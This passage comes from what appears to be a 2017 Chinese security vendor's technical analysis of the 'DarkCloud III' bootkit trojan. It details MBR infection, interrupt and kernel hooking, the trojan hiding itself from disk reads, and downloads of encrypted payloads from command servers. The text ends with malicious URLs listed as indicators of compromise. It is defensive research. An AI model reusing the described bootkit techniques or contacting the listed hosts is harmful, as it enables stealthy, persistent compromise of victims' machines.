data-line="167">加载到内存后，判断ldrvsvc.dll模块的0x156C处是否为“0x8B 0x44 0x24 0x04 0x83 0xE8 0x01”（用来判断是不是已经被patch过），如果判断通过，就将ldrvsvc.dll模块的0x156C patch为”jmp 4C62D”：</p>\n<p class="text-center line" data-line="169"><img src="/uploads/2017/07/25/ffebc399af572d163059cbd8801783cb.png" alt="" width="90%"></p>\n<p class="line" data-line="171">用来对ldrvsvc.dll做patch的代码：</p>\n<p class="text-center line" data-line="173"><img src="/uploads/2017/07/25/eaa5a92ca28ffa2585bb5b50f2cc0cb6.png" alt=""></p>\n<p class="line" data-line="175">被patch后的ldrvsvc.dll，最终会被服务调用，进而执行写入MBR操作。为了防止对MBR的重复写入，木马在写入MBR操作前，会比较MBR是不是特征代码片段：</p>\n<blockquote>\n<p>31 C0 FA 31 DB 8E D3 36 89 26 FE 7B BC FE 7B 1E 66 60 8E DB 3E A1 13 04 24 FC 83 E8 40 3E A3 13</p>\n</blockquote>\n<p class="line" data-line="179">比较MBR是否已经被写入的代码片段：</p>\n<p class="text-center line" data-line="181"><img src="/uploads/2017/07/25/e9919d54440cdbb858292dcc0706ec22.png" alt=""></p>\n<p class="line" data-line="183">木马会把原始的MBR备份到系统第二扇区中，同时在第一扇区中写入恶意代码，在3-63扇区中写入加密过的恶意代码：</p>\n<p class="text-center line" data-line="185"><img src="/uploads/2017/07/25/9303d0fa513bcc7f95d6a2610f3229a9.png" alt="" width="90%"></p>\n<h4 class="line" data-line="187">Bootkit功能分析</h4>\n<p class="line" data-line="189">bootkit功能主要：在内核以TDI 的方式访问网络下载shellcode解密后直接在内核中运行。木马在TDI层用udp连接访问ms.maimai666.com的8064端口获取shellcode。如果失败改用tcp连接ms.maimai666.com的8864获取。得到的内容会在内存中解密，解密后以APC的形式插入到应用层进程中。插入到应用层的代码功能主要为：根据配置文件从 http://www.acsewle.com:8877/ds/cl.db 下载加密后的文件，文件解密后的样本功能在下一小节中分析。</p>\n<p class="line" data-line="191">由上一节对MBR写入过程的调试发现写入MBR后，系统第1个扇区的内容变为下图所示，这是木马的病毒代码：</p>\n<p class="text-center line" data-line="193"><img src="/uploads/2017/07/25/71529405f6d1bac7201e01935973b684.png" alt=""></p>\n<p class="line" data-line="195">系统第1扇区的代码功能为：将磁盘3-63扇区的木马主体加载到内存中解密执行。</p>\n<p class="line" data-line="197">解密部分代码片段：</p>\n<p class="text-center line" data-line="199"><img src="/uploads/2017/07/25/6c3762f4e13d6b9ae103399f3e440642.png" alt=""></p>\n<p class="line" data-line="201">这部分解密代码的功能是：挂钩系统的15号中断，随后读取第二扇区中的备份MBR正常地引导系统启动。</p>\n<p class="line" data-line="203">挂钩系统的15号中断代码片段：</p>\n<p class="text-center line" data-line="205"><img src="/uploads/2017/07/25/3bd39c11abd44bf2895bdd954e50eeeb.png" alt=""></p>\n<p class="line" data-line="207">挂钩成功后，使用第二扇区中备份的系统MBR正常地引导启动：</p>\n<p class="text-center line" data-line="209"><img src="/uploads/2017/07/25/6fe270ce10943e6b8b4716e24f5546dc.png" alt=""></p>\n<p class="line" data-line="211">INT 15中断向量被挂钩前后对比图：</p>\n<p class="text-center line" data-line="213"><img src="/uploads/2017/07/25/7cb1bab3e81c2ef56c7a341beb23469b.png" alt=""></p>\n<p class="line" data-line="215">随后，bootkit会挂钩BILoadImageEx函数、ntoskrnl入口点等。此外，木马还会根据磁盘类型和操作系统替换DriverStartIo、 AtapiHwStartIo、RaUnitStartIo等函数，从而阻止其他程序读取磁盘原始MBR。当检测到读MBR时，返回一个正常的MBR，检测到写MBR时，则直接忽略该操作。这就导致了系统中毒之后，如果木马作者没有打开云控开关的情况会，很难察觉电脑中毒。</p>\n<p class="line" data-line="217">这样，当系统下次启动时，系统引导会通过int 15中断查询内存信息，此时挂钩15号中断的木马便得以第二次获得CPU控制权，获得控制权后木马挂钩BILoadImageEx函数，调用原始15号中断并将控制权交回给系统继续引导。</p>\n<p class="line" data-line="219">当系统引导代码调用BILoadImageEx加载ntoskrnl.exe时，木马便第三次获得控制权，获得控制权后木马再一次执行挂钩操作，此次挂钩的位置是ntoskrnl.exe的入口点，随后将控制权交给系统继续引导。</p>\n<p class="line" data-line="221">当引导完毕进入windows内核时，挂钩ntoskrnl入口点的木马代码第四次获得CPU控制权，此时木马已真正进入windows内核中，获得控制权后，分配一块内存空间，将木马内核的主功能代码拷贝到分配的空间中，并通过创建PsSetCreateThreadNotifyRoutine回调的方式使主功能代码得以执行。至此完成木马由MBR到windows内核的加载过程<sup class="footnote-ref"><a href="#fn1" id="fnref1">[1]</a></sup> <sup class="footnote-ref"><a href="#fn2" id="fnref2">[2]</a></sup> <sup class="footnote-ref"><a href="#fn3" id="fnref3">[3]</a></sup>。</p>\n<h3 class="line" data-line="223">Bootkit所加载木马的分析</h3>\n<p class="line" data-line="225">对bootkit从云端加载的木马进行分析，文件基本信息：</p>\n<table>\n<thead>\n<tr>\n<th></th>\n<th></th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><strong>Hash</strong></td>\n<td>518f9e5b1fb6397a27a0851930625049</td>\n</tr>\n<tr>\n<td><strong>文件类型</strong></td>\n<td>Win32 EXE</td>\n</tr>\n<tr>\n<td><strong>文件大小</strong></td>\n<td>48462字节</td>\n</tr>\n<tr>\n<td><strong>时间戳</strong></td>\n<td>2016.12.16 19:56:11</td>\n</tr>\n<tr>\n<td><strong>首次上传VirusTotal时间</strong></td>\n<td>2017-05-24 22:33:38 UTC</td>\n</tr>\n</tbody>\n</table>\n<p class="line" data-line="235">样本功能：</p>\n<p class="line" data-line="237">访问http://www.acsewle.com:8877/ds/kn.html下载配置文件，解析配置文件中的appurl字段，下载appurl字段的url，根据配置文件中ispe为1，则通过CreateProcess直接加载执行。如果配置文件中ispe为0，则解析下载回来的非PE文件，RC4解密该非PE文件，得到PE加载代码与PE文件，以傀儡进程方式注入svchost.exe，，最后通过解密出来的PE加密代码加载解密出来的PE文件。</p>\n<p class="line" data-line="239">细节如下：</p>\n<p F020C369-7CD6-41ea-A91F-3C52F1B72D0B="" class="line" data-line="241">通过事件实现单一进程运行的，事件名：</p>\n<p class="text-center line" data-line="243"><img src="/uploads/2017/07/25/ee925085321838256ca7379b7d541a5c.png" alt="" width="90%"></p>\n<p class="line" data-line="245">下载配置文件到临时文件中：</p>\n<p class="text-center line" data-line="247"><img src="/uploads/2017/07/25/ac003626642fae3c6d6fd7333b850b35.png" alt="" width="90%"></p>\n<p class="line" data-line="249">访问http://www.acsewle.com:8877/ds/kn.html</p>\n<p class="text-center line" data-line="251"><img src="/uploads/2017/07/25/1995c6346babc733157075ea21684beb.png" alt="" width="90%"></p>\n<pre class="hljs"><code class="hljs">[Config] \n\nversion = 890 \nisexe = 0 \nappurl = http://www.acsewle.com:8877/ds/lcdn.db\n</code></pre>\n<p class="line" data-line="261">解析CONFIG中的配置项目：</p>\n<p class="text-center line" data-line="263"><img src="/uploads/2017/07/25/7c89e9c3ef5433b36e5e3d3a8b485eb0.png" alt="" width="90%"></p>\n<p class="line" data-line="265">解析出 appurl后，会下载appurl的地址到临时文件。</p>\n<p class="line" data-line="267">下载回来的代码如下：</p>\n<p class="text-center line" data-line="269"><img src="/uploads/2017/07/25/8011249a08c35bcff43e61df03a865c6.png" alt="" width="90%"></p>\n<p class="line" data-line="271">其中的格式为：</p>\n<p class="line" data-line="273">前面8字节为“SLDREXEC”，标识字符，图中黑色框部分。绿色框部分为加密过的shellcode的长度。红色框部分为加密shellcode时使用的RC4密钥。褐色框部分为加密过的shellcode的内容。</p>\n<p class="line" data-line="275">使用RC4算法将上面的褐色框部分解密后的内容分为两部分：</p>\n<p class="line" data-line="277">第一部分为代码片段，用于动态加载PE文件</p>\n<p class="line" data-line="279">第二部分为完整的PE文件，从文件偏移0x328处就是一个完整的PE文件。</p>\n<p class="line" data-line="281">PE文件片段如下：</p>\n<p class="text-center line" data-line="283"><img src="/uploads/2017/07/25/1b869ed9bd514c6c38358ca3f43d7a7a.png" alt=""></p>\n<p class="line" data-line="285">解密出来的注入代码如下：</p>\n<p class="text-center line" data-line="287"><img src="/uploads/2017/07/25/e99266a00fd896a3fa8c4170c2fb1524.png" alt=""></p>\n<p class="line" data-line="289">将上面解密出的内容注入到svchost.exe中执行：</p>\n<p class="text-center line" data-line="291"><img src="/uploads/2017/07/25/b3d8df3c0753fb1471a8d799438fc0fe.png" alt=""></p>\n<p class="line" data-line="293">注入到svhost.exe中的代码包含上面所有的解密内容（包括代码片段与完整的PE文件）。</p>\n<p class="line" data-line="295">代码片段的功能是动态获得函数地址，在内存中加载解密出的PE文件：</p>\n<p class="text-center line" data-line="297"><img src="/uploads/2017/07/25/87dd47533d79cd2cf6f30413e34b0a03.png" alt=""></p>\n<p class="line" data-line="299">内存加载PE并到入口点执行</p>\n<p class="text-center line" data-line="301"><img src="/uploads/2017/07/25/aff38627a0c9b0bc69e7fa6ffafcffe3.png" alt=""></p>\n<p class="line" data-line="303">Payload使用了UPX压缩。Payload的功能为，从网上下载lua脚本保存到临时文件，随后使用PE中内置的lua解析程序运行下载的lua脚本。</p>\n<p class="line" data-line="305">从http://www.acsewle.com:8877/ld/ndn.db下载lua脚本到本地：</p>\n<p class="text-center line" data-line="307"><img src="/uploads/2017/07/25/7c279c462a1596b8df87df2f5e2c222c.png" alt="" width="90%"></p>\n<p class="line" data-line="309">使用PE中内置的lua解析器执行lua脚本：</p>\n<p class="text-center line" data-line="311"><img src="/uploads/2017/07/25/9447657683fe2e8c03b9beb7405af3dc.png" alt="" width="90%"></p>\n<p class="line" data-line="313">木马根据云端配置不同的lua脚本实现不同的功能。主要不同的lua的功能包括：统计受害机器信息功能，发动DDOS攻击功能，发起CC攻击功能等。</p>\n<h2 class="line" data-line="315">解决方案</h2>\n<p class="line" data-line="317">从以上的技术分析可以看到，暗云木马感染了MBR，即使重装系统，MBR里的恶意代码还会联网下载木马病毒执行。目前比较稳妥的解决办法是使用360急救箱的强力模式进行系统扫描，360急救箱强力模式会重启系统先于木马启动，从而彻底清除MBR中恶意代码，恢复系统正常MBR。</p>\n<p class="line" data-line="319">360急救箱下载地址：<a href="http://down.360safe.com/360c0mpkill5.1.64.1183-0605.zip">http://down.360safe.com/360c0mpkill5.1.64.1183-0605.zip</a></p>\n<h2 class="line" data-line="321">IOC</h2>\n<p class="line" data-line="323">由于木马一旦感染会先于操作系统启动，在本地进行检查会变得非常困难，但由于木马有相对固定的网络行为，由于可以在网络出口尝试匹配如下URL及相应域名访问尝试，由可以比较有效低成本的发现中招系统。我们提供如下的URL IOC：</p>\n<p class="line" data-line="325">http://www.acsewle.com:8877/ds/kn.html</p>\n<p class="line" data-line="327">http://ms.maimai666.com</p>\n<p class="line" data-line="329">http://www.acsewle.com:8877/ds/cl.db</p>\n<p class="line" data-line="331">http://www.acsewle.com:8877/ds/lcdn.db</p>\n<p class="line" data-line="333">http://www.acsewle.com:8877/ds/ndn.db</p>\n<p class="line" data-line="335">http://www.2tf1.com/upcfg.db</p>\n<p class="line" data-line="337">http://update.njmmy.com:8089/config/LDrvSvc.zip</p>\n<p class="line" data-line="339">http://www.acsewle.com:8877/um.php</p>\n<h2 class="line" data-line="341">参考信息</h2>\n<hr class="footnotes-sep">\n<section class="footnotes">\n<ol class="footnotes-list">\n<li id="fn1" class="footnote-item"><p><a href="http://bbs.guanjia.qq.com/forum.php?mod=viewthread&amp;tid=5307974">http://bbs.guanjia.qq.com/forum.php?mod=viewthread&amp;tid=5307974</a> <a href="#fnref1" class="footnote-backref">↩︎</a></p>\n</li>\n<li id="fn2" class="footnote-item"><p><a href="https://mp.weixin.qq.com/s/MYbSHWHE4qpa0XJ3N6nAzw">https://mp.weixin.qq.com/s/MYbSHWHE4qpa0XJ3N6nAzw</a> <a href="#fnref2" class="footnote-backref">↩︎</a></p>\n</li>\n<li id="fn3" class="footnote-item"><p><a href="http://www.freebuf.com/articles/system/134017.html">http://www.freebuf.com/articles/system/134017.html</a> <a href="#fnref3" class="footnote-backref">↩︎</a></p>\n</li>\n</ol>\n</section>\n',category:"专题报告",__v:1,modify_time:"2017-08-01T08:02:52.105Z",abstract:"2017年6月9日，关于一款名为“暗云III”木马的信息在互联网传播，据称此木马具有隐蔽性强、潜在危害大、传播范围广等特点。木马主要通过外挂、游戏辅助、私服登录器等传播，此类软件通常诱导用户关闭安全软件后使用，使得木马得以乘机植入。木马主要通过云控进行任务发布，传播及执行恶意功能时无文件写入磁盘，同时木马所具有的bootkit能力也使得木马的运行更加隐而且难以查杀。本报告对木马的相关技术进行分析，并提供解决方法和检查确认建议。",readableId:"darkcloud3-botnet-technical-analysis",publish_time:"2017-06-14T15:27:52.000Z",descImg:"/uploads/2017/08/01/f8ac5e02af0e3da2ff7436f8250cd7a9.png",insert_time:"2017-07-25T12:03:51.378Z",isDraft:!1,tags:["DarkCloud","暗云3","暗云"]}},serverRendered:!0}</script><script defer src="/_nuxt/manifest.863edfce59f0a00ce608.js"></script><script defer src="/_nuxt/vendor.bundle.21224f443c6ee9ce918d.js"></script><script defer src="/_nuxt/nuxt.bundle.b8b247420f15d35e36d4.js"></script>